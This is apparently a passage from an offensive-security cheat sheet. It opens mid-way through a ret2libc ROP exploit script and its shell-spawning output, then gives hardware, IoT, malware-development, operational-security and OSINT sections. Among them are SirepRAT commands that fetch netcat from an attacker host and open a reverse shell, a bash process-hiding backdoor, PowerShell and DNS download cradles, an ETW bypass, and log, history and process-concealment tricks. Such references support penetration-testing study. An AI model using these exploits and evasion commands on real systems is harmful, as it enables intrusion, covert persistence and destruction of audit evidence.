p = process("./vuln")

# inspect files
binary = ELF("./vuln")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# get gadgets from binary
binary_gadgets = ROP(binary)

# get a "pop rdi" (first param goes to rdi)
POP_RDI = (binary_gadgets.find_gadget(['pop rdi', 'ret']))[0]
# or ROPgadget --binary vuln | grep "pop rdi"

# RET = (binary_gadgets.find_gadget(['ret']))[0]

# get puts plt address to exec put()
plt_puts = binary.plt['puts']

# get main address to exec main()
plt_main = binary.symbols['main']

# get got puts for the leak addr
got_puts = binary.got['puts']

junk = "A" * 40      # Fill buffer

rop = junk
rop += p64(POP_RDI)    # Put next line as first param
rop += p64(got_puts)   # Param
rop += p64(plt_puts)   # Exec puts()
rop += p64(plt_main)   # Restart main()

p.sendlineafter("ROP.", rop)

p.recvline()
p.recvline()

# get and parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked lib puts  : %s", hex(leak))

# puts offset in libc
log.info("libc puts offset : %s", hex(libc.sym["puts"]))

# Set lib base address (next sym() calls will rely ont he new address) 
libc.address = leak - libc.sym["puts"]
log.info("libc start addr  : %s", hex(libc.address))

BINSH = next(libc.search("/bin/sh"))   # Get /bin/sh addr
SYSTEM = libc.sym["system"] # Get system addr

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))

rop2 = junk
#rop2 += p64(RET)
rop2 += p64(POP_RDI)
rop2 += p64(BINSH)
rop2 += p64(SYSTEM)

p.sendlineafter("ROP.", rop2)
p.interactive()
```

### Result

```c
$ python <FILE>.py
[+] Starting local process './<FILE>': pid 5442
[*] '/PATH/TO/FILE/<FILE>'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded cached gadgets for './<FILE>'
[*] Leaked lib puts  : 0x7f0f9c3e7910
[*] libc puts offset : 0x71910
[*] libc start addr  : 0x7f0f9c376000
[*] bin/sh 0x7f0f9c4f7519 
[*] system 0x7f0f9c3ba9c0 
[*] Switching to interactive mode

$
```






# Hardware

- [Resources](#resources)

## Table of Contents

- [Signal Decoding](#signal-decoding)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Bash-RF PI | Script with several tools to brute force garages, hack radio stations and capture and analyze radio signals with Raspberry Pi | https://github.com/Lucstay11/Brute-force-garage-and-hack-rf |
| Firmware Analysis Toolkit | Toolkit to emulate firmware and analyse it for security vulnerabilities | https://github.com/attify/firmware-analysis-toolkit |
| HardwareAllTheThings | Hardware/IOT Pentesting Wiki | https://github.com/swisskyrepo/HardwareAllTheThings |
| OWASP Firmware Security Testing Methodology | FSTM is composed of nine stages tailored to enable security researchers, software developers, hobbyists, and Information Security professionals with conducting firmware security assessments. | https://scriptingxss.gitbook.io/firmware-security-testing-methodology |
| P4wnP1 A.L.O.A. | P4wnP1 A.L.O.A. by MaMe82 is a framework which turns a Rapsberry Pi Zero W into a flexible, low-cost platform for pentesting, red teaming and physical engagements ... or into "A Little Offensive Appliance". | https://github.com/RoganDawes/P4wnP1_aloa |
| P4wnP1 by MaMe82 | P4wnP1 is a highly customizable USB attack platform, based on a low cost Raspberry Pi Zero or Raspberry Pi Zero W (required for HID backdoor). | https://github.com/RoganDawes/P4wnP1 |
| rtl_433 | Program to decode radio transmissions from devices on the ISM bands (and other frequencies) | https://github.com/merbanan/rtl_433 |
| saleae | Logic Analyzer | https://discuss.saleae.com/ |

## Signal Decoding

### rtl433 / cf32

> https://github.com/merbanan/rtl_433

> https://triq.org/

```c
$ rtl_433 -r <FILE>.cf32 -A
```








# IoT

- [Resources](#resources)

## Table of Contents

- [Mosquitto (MQTT)](#mosquitto-mqtt)
- [SirepRAT](#sireprat)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| MQTT-PWN | MQTT-PWN intends to be a one-stop-shop for IoT Broker penetration-testing and security assessment operations. | https://github.com/akamai-threat-research/mqtt-pwn |
| Python-based MQTT Client Shell | Python-based MQTT client command shell | https://github.com/bapowell/python-mqtt-client-shell |
| SirepRAT | Remote Command Execution as SYSTEM on Windows IoT Core (releases available for Python2.7 & Python3)  | https://github.com/SafeBreach-Labs/SirepRAT |

## Mosquitto (MQTT)

### Client Tools

```c
$ sudo apt-get install mosquitto mosquitto-clients
```

```c
$ mosquitto_sub -h <RHOST> -t U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub
$ mosquitto_pub -h <RHOST> -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -m 'hello'
```

### Sending Commands

```c
{ "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls" }
```

```c
$ mosquitto_pub -h <RHOST> -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -m 'eyAiaWQiOiAiY2RkMWIxYzAtMWM0MC00YjBmLThlMjItNjFiMzU3NTQ4YjdkIiwgImNtZCI6ICJDTUQiLCAiYXJnIjogImxzIiB9'
```

### Python-based MQTT Client Shell

> https://github.com/bapowell/python-mqtt-client-shell

```c
$ python mqtt_client_shell.py
> host=<RHOST>
> host <RHOST>
> connect
> subscribe
> subscribe topic 0, 1, 2, 3
> exit
```

## SirepRAT

> https://github.com/SafeBreach-Labs/SirepRAT

### Upload

```c
$ python SirepRAT.py <RHOST> LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -OutFile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -Uri http://<LHOST>:80/nc64.exe" --v
```

### Command Execution

```c
$ python SirepRAT.py <RHOST> LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe <LHOST> <LPORT> -e powershell.exe" --v
```

```c
$ $env:UserName                                                        // get the current username
$ $credential = Import-CliXml -Path U:\Users\administrator\root.txt    // accessing a file
$ $credential.GetNetworkCredential().Password                          // show input
```







# Malware Development

- [Resources](#resources)

## Table of Contents

- [Bash Backdoor](#bash-backdoor)
- [Endpoint Protection & Response (EDR)](#endpoint-protection--response-edr)
- [Microsoft Windows API](#microsoft-windows-api)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| AmsiScanBufferBypass | Bypass AMSI by patching AmsiScanBuffer | https://github.com/rasta-mouse/AmsiScanBufferBypass |
| ASM HalosGate Direct System Caller | x64 Assembly HalosGate direct System Caller to evade EDR UserLand hooks | https://github.com/boku7/AsmHalosGate |
| BouncyGate | HellsGate in Nim, but making sure that all syscalls go through NTDLL.DLL (as in RecycledGate). | https://github.com/eversinc33/BouncyGate |
| FreshyCalls: Syscalls Freshly Squeezed! | FreshyCalls tries to make the use of syscalls comfortable and simple, without generating too much boilerplate and in modern C++17! | https://github.com/crummie5/FreshyCalls |
| Hell's Gate | Original C Implementation of the Hell's Gate VX Technique | https://github.com/am0nsec/HellsGate |
| HellsHall - Another Way To Fetch Clean Syscalls | Performing Indirect Clean Syscalls | https://github.com/Maldev-Academy/HellHall |
| Linux syscall tables | n/a | https://syscalls.mebeim.net/?table=x86/64/x64/v6.2 |
| Maldev | Golang library for malware development and red teamers | https://github.com/D3Ext/maldev |
| Microsoft Windows System Call Table (XP/2003/Vista/2008/7/2012/8/10) | n/a | https://j00ru.vexillium.org/syscalls/nt/64/?s=09 |
| MutationGate | Use hardware breakpoint to dynamically change SSN in run-time | https://github.com/senzee1984/MutationGate |
| NimHollow | Nim implementation of Process Hollowing using syscalls (PoC) | https://github.com/xdavidel/NimHollow |
| NimlineWhisperer2 | A tool for converting SysWhispers2 syscalls for use with Nim projects | https://github.com/ajpc500/NimlineWhispers2 |
| nim-strenc | A tiny library to automatically encrypt string literals in Nim code | https://github.com/Yardanico/nim-strenc |
| OffensiveCpp | This repo contains C/C++ snippets that can be handy in specific offensive scenarios. | https://github.com/lsecqt/OffensiveCpp |
| Offensive-C-Sharp | I wrote these while learning AD Pentesting and windows hacking | https://github.com/winsecurity/Offensive-C-Sharp |
| OffensiveCSharp | Collection of Offensive C# Tooling | https://github.com/matterpreter/OffensiveCSharp |
| OffensiveGo | Golang weaponization for red teamers. | https://github.com/Enelg52/OffensiveGo |
| OffensiveLua | Offensive Lua is a collection of offensive security scripts written in Lua with FFI. | https://github.com/hackerhouse-opensource/OffensiveLua |
| OffensiveNim | Experiments in weaponizing Nim for implant development and general offensive operations. | https://github.com/0xsyr0/OffensiveNim |
| OffensiveRust | Rust Weaponization for Red Team Engagements. | https://github.com/trickster0/OffensiveRust |
| ParallelSyscalls | Companion code to the "EDR Parallel-asis through Analysis" found: https://www.mdsec.co.uk/2022/01/edr-parallel-asis-through-analysis | https://github.com/mdsecactivebreach/ParallelSyscalls |
| PoolParty | A set of fully-undetectable process injection techniques abusing Windows Thread Pools | https://github.com/SafeBreach-Labs/PoolParty |
| RecycledGate | Hellsgate + Halosgate/Tartarosgate. Ensures that all systemcalls go through ntdll.dll | https://github.com/thefLink/RecycledGate |
| RustRedOps | 🦀 RustRedOps is a repository dedicated to gathering and sharing advanced techniques and offensive malware for Red Team, with a specific focus on the Rust programming language. (In Construction) | https://github.com/joaoviictorti/RustRedOps |
| Ruy-Lopez | This repository contains the Proof-of-Concept(PoC) for a new approach to completely prevent DLLs from being loaded into a newly spawned process. | https://github.com/S3cur3Th1sSh1t/Ruy-Lopez |
| SysWhispers | AV/EDR evasion via direct system calls. | https://github.com/jthuraisamy/SysWhispers |
| SysWhispers2 | AV/EDR evasion via direct system calls. | https://github.com/jthuraisamy/SysWhispers2 |
| SysWhispers3 | SysWhispers on Steroids - AV/EDR evasion via direct system calls. | https://github.com/klezVirus/SysWhispers3 |
| Tartarus' Gate - Bypassing EDRs | TartarusGate, Bypassing EDRs | https://github.com/trickster0/TartarusGate |
| Tartarus-TpAllocInject | This is a simple loader that was published along with the blog post for Nettitude Labs on "Creating an OPSEC safe loader for Red Team Operations". | https://github.com/nettitude/Tartarus-TpAllocInject |
| Win32 Offensive Cheatsheet | Win32 and Kernel abusing techniques for pentesters | https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet |

## Bash Backdoor

This is an old Linux trick executed in `Bash` that simply `over-mounts` a particular `PID` in `/proc` with a useless, empty directory, so that `/proc/<PID>` doesn't get populated with the usual process information (invisible to the `ps` command, for example).
Requires `root` permissions; either execute it in your shell or slap it into `/root/.bashrc`.

Thanks to Alh4zr3d and THC for sharing!

```c
hide()
{
[[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; }
_pid=${1:-$$}
[[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && echo "[Backdoor] PID $_pid is now hidden"; return; }
local _argstr
for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done
[[ $(bash -c "ps -o stat= -p \$\$") =~ \+ ]] || exec bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
}
```

### Examples

- Hide the current shell/PID: `hide`
- Hide process with pid 31337: `hide 31337`
- Hide `sleep 1234`: hide sleep 1234
- Start and hide `sleep 1234` as a background process: `hide nohup sleep 1234 &>/dev/null &`

## Endpoint Protection & Response (EDR)

### Diagram of System Calls

```c
    Kernel

      ^ (Syscall)
      |

    ntdll.dll < Monitored by EDR

      ^ (NtAllocateVirtualMemoryEx)
      |

    Win32 API
    (System32 DLLs)

      ^ (VirtualAllocEx)
      |

    Written Code
```

Basically the `EDR` replaces the `call instruction` of the `syscall` with a `jump instruction` to the `EDR` process.

The `Hells Gate Technique` requires to read the `ntdll.dll` from disk, because the `ntdll.dll` in memory, is hooked by the `EDR`.

## Microsoft Windows API

### Keyloggers

- GetAsyncKeyState
- GetKeyState
- SetWindowsHookExA

### Networking

- WSAStartup
- WSASocket
- WSACleanup
- socket
- bind
- WSAIoctl
- ioctlsocket()

### Downloading

- URLDownloadToFile
- ShellExecute
- WinExec

### HTTP

- InternetOpen
- InternetConnect
- HttpOpenRequest
- HttpAddRequestHeaders
- HTTPSendRequest
- InternetReadFile

### Droppers

- FindResource
- LoadResource
- SizeOfResource
- LockResource

### DLL Injection

#### SetWindowsHookEx

- LoadLibraryA
- GetProcAddress
- GetWindowsThreadProcessId
- SetWindowsHookEx
- BroadcastSystemMessage
- GetMessage
- DispatchMessage

#### CreateRemoteThread

- OpenProcess
- VirtualAllocEx
- WriteProcessMemory
- GetModuleHandle
- GetProcAddress
- CreateRemoteThread
- LoadLibraryA

### API Hooking

- GetProcAddress
- VirtualProtect
- ReadProcessMemory

### Process Hollowing

- CreateProcessA
- NtUnmapViewOfSection
- VirtualAllocEx
- WriteProcessMemory

### Anti-Debug / Anti-VM

- GetTickCount
- CountClipboardFormats
- GetForeGroundWindow
- IsDebuggerPresent
- CreateToolhelp32Snapshot
- CheckRemoteDebuggerPresent
- NtQueryInformationProcess
- ZwQueryInformationProcess
- NtSetInformationThread
- ZwSetInformationThread
- NtQueryObject
- OutputDebugString
- EventPairHandles
- CsrGetProcessID
- CloseHandle
- NtClose
- IsDebugged Flag
- Heap Flag

### Alternate Data Streams

- FindFirstStreamW
- FindNextStreamW

### Encryption (WinCryptAPI)

- CryptCreateHash
- CryptEncrypt
- CryptDecrypt
- CryptGenKey
- CryptDeriveKey
- CryptAcquireContext

Algid indicates used algorithm. (0x000066xx)

### Compression

- RtlCompressBuffer
- RtlDecompressBuffer

### Hashing

- CryptAcquireContext
- CryptCreateHash
- BCryptCreateHash
- CryptEncrypt/Decrypt

### Misc

- Process32First
- FindWindowsA
- RegSetValueEx
- CreateThread
- GetEIP
- GetFileSize
- malloc
- free
- GetTempPathA
- WinExec
- GetModuleHandleA
- ResumeThread
- NtAllocateVirtualMemory
- NtOpenProcess
- ZwWriteVirtualMemory
- ZwResumeThread
- NtOpenEvent
- NtCreateEvent
- NtCreateUserProcess
- AdjustTokenPrivileges
- CreateFileMapping
- CreateMutex
- FindResource
- GetModuleFilename
- LdrLoadDll





# Mobile

- [Resources](#resource)

## Table of Contents

- [Apktool](#apktool)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| android-penetration-testing-cheat-sheet | Checklist for Android Penetration Testing | https://github.com/ivan-sincek/android-penetration-testing-cheat-sheet |
| APKLeaks | Scanning APK file for URIs, endpoints & secrets. | https://github.com/dwisiswant0/apkleaks |
| Apktool | A tool for reverse engineering Android apk files | https://github.com/iBotPeaches/Apktool |
| apk.sh | apk.sh makes reverse engineering Android apps easier, automating some repetitive tasks like pulling, decoding, rebuilding and patching an APK. | https://github.com/ax/apk.sh |
| Awesome iOS Security | A curated list of awesome iOS application security resources. | https://github.com/Cy-clon3/awesome-ios-security |
| dex2jar | Tools to work with android .dex and java .class files | https://github.com/pxb1988/dex2jar |
| medusa | Binary instrumentation framework based on FRIDA | https://github.com/Ch0pin/medusa |
| Mobile Application Penetration Testing Cheat Sheet | The Mobile App Pentest cheat sheet was created to provide concise collection of high value information on specific mobile application penetration testing topics. | https://github.com/tanprathan/MobileApp-Pentest-Cheatsheet |
| Mobile Security Framework (MobSF) | Mobile Security Framework (MobSF) is an automated, all-in-one mobile application (Android/iOS/Windows) pen-testing, malware analysis and security assessment framework capable of performing static and dynamic analysis. | https://github.com/MobSF/Mobile-Security-Framework-MobSF |
| Mobile Verification Toolkit | MVT (Mobile Verification Toolkit) helps with conducting forensics of mobile devices in order to find signs of a potential compromise. | https://github.com/mvt-project/mvt |
| OWASP Mobile Application Security Testing Guide (MASTG) | The Mobile Application Security Testing Guide (MASTG) is a comprehensive manual for mobile app security testing and reverse engineering. It describes the technical processes for verifying the controls listed in the OWASP Mobile Application Security Verification Standard (MASVS). | https://github.com/OWASP/owasp-mastg |
| PhoneSploit Pro | An all-in-one hacking tool to remotely exploit Android devices using ADB and Metasploit-Framework to get a Meterpreter session. | https://github.com/AzeemIdrisi/PhoneSploit-Pro |
| QuadraInspect | QuadraInspect is an Android framework that integrates AndroPass, APKUtil, and MobFS, providing a powerful tool for analyzing the security of Android applications. | https://github.com/morpheuslord/QuadraInspect |

## Apktool

> https://github.com/iBotPeaches/Apktool

> https://medium.com/@sandeepcirusanagunla/decompile-and-recompile-an-android-apk-using-apktool-3d84c2055a82

### Decompiling

```c
$ apktool d <FILE>.apk
$ apktool d -f -r <FILE>.apk
```

### Compiling

```c
$ apktool b <SOURCE_FOLDER>
```

### Compiling and Signing

```c
$ java -jar apktool_2.6.1.jar b -f -d /PATH/TO/FOLDER/ -o <FILE>.apk
$ keytool -genkey -v -keystore my-release-key.keystore -alias <ALIAS> -keyalg RSA -keysize 2048 -validity 10000
$ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore <FILE>.apk <ALIAS>
$ jarsigner -verify -verbose -certs <FILE>.apk
```






# Operational Security

## Table of Contents

- [.NET Reflection](#net-reflection)
- [Avoid Invoke-Expression (IEX) and Invoke-WebRequest (IWR)](#avoid-invoke-expression-iex-and-invoke-webrequest-iwr)
- [Bypassing Event Tracing for Windows (ETW)](#bypassing-event-tracing-for-windows-etw)
- [Clear Linux History](#clear-linux-history)
- [Hiding SSH Sessions](#hiding-ssh-sessions)
- [Logfile Cleaning](#logfile-cleaning)
- [LOLBAS](#lolbas)
- [Process Hiding](#process-hiding)
- [ProxyChains](#proxychains)
- [Save File Deletion](#save-file-deletion)
- [Sneaky Directory](#sneaky-directory)
- [Windows Advanced Threat Protection (ATP)](#windows-advanced-threat-protection-atp)

## .NET Reflection

```c
PS C:\> $d = (New-Object System.Net.WebClient).DownloadData('http://<LHOST>/Rubeus.exe')
PS C:\> $a = [System.Reflection.Assembly]::Load($d)
PS C:\> [Rubeus.Program]::Main("-h".Split())
```

## Avoid Invoke-Expression (IEX) and Invoke-WebRequest (IWR)

Instead of using `IEX` and `IWR` within assessments, try this:

* Host a text record with the payload at one of the unburned domains

| Name | Type | Value | TTL |
| --- | --- | --- | --- |
| cradle1 | TXT | "IEX(New-Object Net.WebClient).DownloadString($URI)" | 3600 |

```c
C:\> powershell . (nslookup -q=txt cradle1.domain.example)[-1]
```

```c
PS C:\> (nslookup -q=txt cradle1.domain.example)[-1]
```

```c
PS C:\> powershell '$URI=""""https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1"""";'(nslookup -q=txt cradle1.domain.example)[-1]';Get-Domain'
```

Example with `PowerSharpPack`.

```c
C:\> powershell
PS C:\> (nslookup -q=txt cradle1.domain.example)[-1]
PS C:\> powershell '$URI=""""https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1"""";'(nslookup -q=txt cradle1.example.domain)[-1]';PowerSharpPack'
```

### Concatinate Payloads

```c
PS C:\> powershell . (-Join (Resolve-DnsName -Type txt https://<DOMAIN>).Strings)
```

## Bypassing Event Tracing for Windows (ETW)

```c
C:\> set COMPlus_ETWEnabled=0
```

## Clear Linux History

```c
* echo "" > /var/log/auth.log
* echo "" > ~/.bash_history
* rm ~/.bash_history
* history -c
* export HISTFILESIZE=0
* export HISTSIZE=0
* kill -9 $$
* ln -sf /dev/null ~/.bash_history
* ln -sf /dev/null ~/.bash_history && history -c && exit
```

## Hiding SSH Sessions

```c
$ ssh -o UserKnownHostsFile=/dev/null -T <USERNAME>@<RHOST> 'bash -i'
```

- It is not added to `/var/log/utmp`
- It won't appear in the output of `w` or `who` commands
- No `.profile` or `.bash_profile` modification needed

## Logfile Cleaning

```c
$ cd /dev/shm; grep -v '<RHOST>' /var/log/auth.log > <FILE>.log; cat <FILE>.log > /var/log/auth.log; rm -f <FILE>.log
```

Notice that this modification of the logfile is most likely to be spotted.

## LOLBAS

### AppLocker Bypass

`<FILE>.url`:

```c
[internetshortcut]
url=C:\Windows\system32\calc.exe
```

```c
C:\Windows\system32> rundll32 C:\Windows\system32\ieframe.dll,OpenURL C:\<FILE>.url
```

### Port Forwarding with netsh

```c
C:\> netsh interface portproxy add v4tov4 listenaddress=<RHOST> listenport=<RPORT> connectaddress=<LHOST> connectport=<LPORT>
```

## Process Hiding

```c
$ echo 'ps(){ command ps "$@" | exec -a GREP grep -Fv -e <COMMAND> -e GREP; }' >> ~/.bashrc && touch -r /etc/passwd ~/.bashrc
$ echo 'top(){ command top "$@" | exec -a GREP grep -Fv -e <COMMAND> -e GREP; }' >> ~/.bashrc && touch -r /etc/passwd ~/.bashrc
$ echo 'htop(){ command htop "$@" | exec -a GREP grep -Fv -e <COMMAND> -e GREP; }' >> ~/.bashrc && touch -r /etc/passwd ~/.bashrc
$ echo 'procs(){ command procs "$@" | exec -a GREP grep -Fv -e <COMMAND> -e GREP; }' >> ~/.bashrc && touch -r /etc/passwd ~/.bashrc
$ echo 'pgrep(){ command pgrep "$@" | exec -a GREP grep -Fv -e <COMMAND> -e GREP; }' >> ~/.bashrc && touch -r /etc/passwd ~/.bashrc
$ echo 'pstree(){ command pstree "$@" | exec -a GREP grep -Fv -e <COMMAND> -e GREP; }' >> ~/.bashrc && touch -r /etc/passwd ~/.bashrc
```

## ProxyChains

> https://github.com/haad/proxychains

```c
$ proxychains <APPLICATION>
```

### Configuration

```c
socks4 metasploit
socks5 ssh
socks4  127.0.0.1 1080
socks5  127.0.0.1 1080
```

### Proxychain the whole Terminal Input

```c
$ proxychains zsh
$ nmap -p 80 <RHOST>
```

## Save File Deletion

```c
$ shred -z <FILE>
```

Alternatively:

```c
$ FN=<FILE>; dd bs=1k count="`du -sk \"${FN}\" | cut -f1`" if=/dev/urandom >"${FN}"; rm -f "${FN}"
```

## Sneaky Directory

```c
$ sudo mkdir -p /mnt/.../<DIRECTORY>
```

## Windows Advanced Threat Protection (ATP)

### Information

Process:
- MsSense.exe

Service:
- Display name: Windows Defender Advanced Threat Protection Service

Name:
- Sense

Registry:
- HKLM\SOFTWARE\Policies\Microsoft\Windows Advanced Threat Protection

File Paths:
- C:\Program Files\Windows Defender Advanced Threat Protection\

### Check Registry

```c
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows Advanced Threat Protection /s
```

### Check Service

```c
C:\> sc query sense
PS C:\> Get-Service Sense
```

### Process

```c
C:\> tasklist | findstr /i mssense.exe
```




# OSINT

- [Resources](#resources)

## Table of Contents

- [Fast Google Dorks Scan](#fast-google-dorks-scan)
- [Google](#google)
- [h8mail](#h8mail)
- [Photon](#photon)
- [Social Analyzer](#social-analyzer)
- [theHarvester](#theharvester)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| cloud_enum | Multi-cloud OSINT tool. Enumerate public resources in AWS, Azure, and Google Cloud. | https://github.com/initstring/cloud_enum |
| DeHashed | Breach Monitoring  | https://dehashed.com |
| DorkSearch | Faster Google Dorking | https://dorksearch.com |
| Exploit-DB - Google Hacking Database | Exploit Database Google Dorks | https://www.exploit-db.com/google-hacking-database |
| GHunt |  GHunt is a modulable OSINT tool designed to evolve over the years, and incorporates many techniques to investigate Google accounts, or objects. | https://github.com/mxrch/GHunt |
| GitFive | Track down GitHub users. | https://github.com/mxrch/GitFive |
| hunter | Hunter lets you find professional email addresses in seconds and connect with the people that matter for your business. | https://hunter.io |
| Intelligence X | OSINT Search Engine | https://intelx.io |
| linkedin2username | Generate username lists from companies on LinkedIn. | https://github.com/initstring/linkedin2username |
| NerdyData | Get a list of websites that use certain technologies, plus their company and spend data. | https://www.nerdydata.com |
| Osintgram | Osintgram is a OSINT tool on Instagram. It offers an interactive shell to perform analysis on Instagram account of any users by its nickname. | https://github.com/Datalux/Osintgram |
| OSINT Recon Tool | OSINT Mindmap Tool | https://recontool.org/#mindmap |
| osintui | Open Source Intelligence Terminal User Interface | https://github.com/wssheldon/osintui |
| Recon-ng | Open Source Intelligence gathering tool aimed at reducing the time spent harvesting information from open sources. | https://github.com/lanmaster53/recon-ng |
| Sherlock | Hunt down social media accounts by username across social networks. | https://github.com/sherlock-project/sherlock |
| tweets_analyzer | Tweets metadata scraper & activity analyzer | https://github.com/x0rz/tweets_analyzer |

## Fast Google Dorks Scan

> https://github.com/IvanGlinkin/Fast-Google-Dorks-Scan

```c
$ ./FGDS.sh <DOMAIN>
$ proxychains bash ./FGDS.sh <DOMAIN>
```

## Google

### Google Dorks

> https://cheatsheet.haax.fr/open-source-intelligence-osint/dorks/google_dorks/

> https://www.searchenginejournal.com/google-search-operators-commands/215331/

```c
intitle:index.of <TEXT>    // open directory listings
```

```c
ext:php
inurl:%3F
site:*.*.*.<DOMAIN>
filetype:txt
```

##### Example

```c
ext:php inurl:? site:<DOMAIN>
```

#### Juicy Extensions

```c
ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess site:<DOMAIN>
```

#### Cloud Environments

```c
site:http://s3.amazonaws.com "<DOMAIN>"
site:http://blob.core.windows.net "<DOMAIN>"
site:http://googleapis.com "<DOMAIN>"
site:http://drive.google.com "<DOMAIN>"
```

#### Leaks

```c
site:http://jsfiddle.net "<DOMAIN>"
site:http://codebeautify.org "<DOMAIN>"
site:http://codepen.io "<DOMAIN>"
site:http://pastebin.com "<DOMAIN>"
```

##### Example

```c
site:http://jsfiddle.net | site:http://codebeautify.org | site:http://codepen.io | site:http://pastebin.com "<DOMAIN>"
site:http://jsfiddle.net | site:http://codebeautify.org | site:http://codepen.io | site:http://pastebin.com "<DOMAIN>" "demo" "test" "api"
```

#### Open Redirects

```c
inurl:page= | inurl:url= | inurl:return= | inurl:next= | inurl:redir= | inurl:redirect= | inurl:target= | inurl:page= inurl:& inurl:http site:http://<DOMAIN>
```

#### Server-Side Request Forgery (SSRF)

```c
inurl:http | inurl:proxy= | inurl:html= | inurl:data= | inurl:resource= inurl:& site:<DOMAIN>
```

### Google ID

> https://medium.com/week-in-osint/getting-a-grasp-on-googleids-77a8ab707e43

#### Setup

1. Add a new contact to you google account (email address required)
2. Open developer tools and select the network tab
3. Reload the page
4. Set the right pane to request
5. Check all batchexecute packets

##### Example

> https://contacts.google.com/_/ContactsUi/data/batchexecute?rpcids=OSOtuf&f.sid=-916332265175998083&bl=boq_contactsuiserver_20200707.13_p0&hl=en&soc-app=527&soc-platform=1&soc-device=1&_reqid=765234&rt=c

6. Watch out for a string like the following one

##### Example

```c
[[["OSOtuf","[\"55fa738b0a752dc5\",\"117395327982835488254\"]",null,"generic"]]]
```

The Google ID's are always `21` characters long and starting with `10` or `11`.

> https://get.google.com/albumarchive/<USERID>

> https://www.google.com/maps/contrib/<USERID>

## h8mail

> https://github.com/khast3x/h8mail

```c
$ h8mail -t <EMAIL>
```

## Photon

> https://github.com/s0md3v/Photon

```c
$ python3 photon.py -u https://<DOMAIN> -l 3 -t 100 --wayback
```

## Recon-ng

### Common Commands

```c
$ recon-ng
$ recon-ng -w <WORKSPACE>
[recon-ng][default] > workspaces create <WORKSPACE>
[recon-ng][default] > db schema
[recon-ng][default] > db insert domains
[recon-ng][default] > marketplace search
[recon-ng][default] > marketplace search <NAME>
[recon-ng][default] > marketplace info <NAME>
[recon-ng][default] > marketplace install <NAME>
[recon-ng][default] > marketplace remove <NAME>
[recon-ng][default] > modules search
[recon-ng][default] > modules load <MODULE>
[recon-ng][default][<MODULE>] > info
[recon-ng][default][<MODULE>] > options list
[recon-ng][default][<MODULE>] > options set <VALUE>
[recon-ng][default][<MODULE>] > run
[recon-ng][default] > keys list
[recon-ng][default] > keys add <KEY> <VALUE>
[recon-ng][default] > keys remove <KEY>
```

`Ctrl+c` unloads a module.

## Social Analyzer

> https://github.com/qeeqbox/social-analyzer

```c
$ python3 app.py --cli --mode "fast" --username "<GIVENNAME> <SURNAME>" --websites "youtube facebook instagram" --output "pretty" --options "found,title,link,rate"
```

## theHarvester

> https://github.com/laramies/theHarvester

```c
$ theHarvester -d <DOMAIN> -l 500 -b google -f myresults.html
```




# Payloads

- [Resources](#resources)

## Table of Contents

- [.LNK (Link) Files](#lnk-link-file)
- [.SCF (Shell Command File) File](#scf-shell-command-file-file)
- [An HTML Application (HTA)](#an-html-application-hta)
- [Background Reverse Shells](#background-reverse-shells)
- [Bad PDF](#bad-pdf)
- [Bash Reverse Shell](#bash-reverse-shell)
- [curl Reverse Shell](#curl-reverse-shell)
- [Donut](#donut)
- [Exiftool](#exiftool)
- [GhostScript](#ghostscript)
- [GIF](#gif)
- [Groovy (Jenkins) Reverse Shell](#groovy-jenkins-reverse-shell)
- [iconv](#iconf)
- [JAVA Reverse Shell](#java-reverse-shell)
- [JavaScript Keylogger](#javascript-keylogger)
- [JDWP](#jdwp)
- [Lua Reverse Shell](#lua-reverse-shell)
- [Macros](#macros)
- [marco_pack](#macro-pack)
- [Markdown Reverse Shell](#markdown-reverse-shell)
- [mkfifo Reverse Shell](#mkfifo-reverse-shell)
- [msfvenom](#msfvenom)
- [Netcat Reverse Shell](#netcat-reverse-shell)
- [Nishang](#nishang)
- [ntlm_theft](#ntml_theft)
- [PDF](#pdf)
- [Perl Reverse Shell](#perl-reverse-shell)
- [PHP popen Web Shell](#php-popen-web-shell)
- [PHP Reverse Shell](#php-reverse-shell)
- [PHP Web Shell](#php-web-shell)
- [PowerShell Reverse Shell](#powershell-reverse-shell)
- [Python Reverse Shell](#python-reverse-shell)
- [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
- [Ruby Reverse Shell](#ruby-reverse-shell)
- [ScareCrow](#scarecrow)
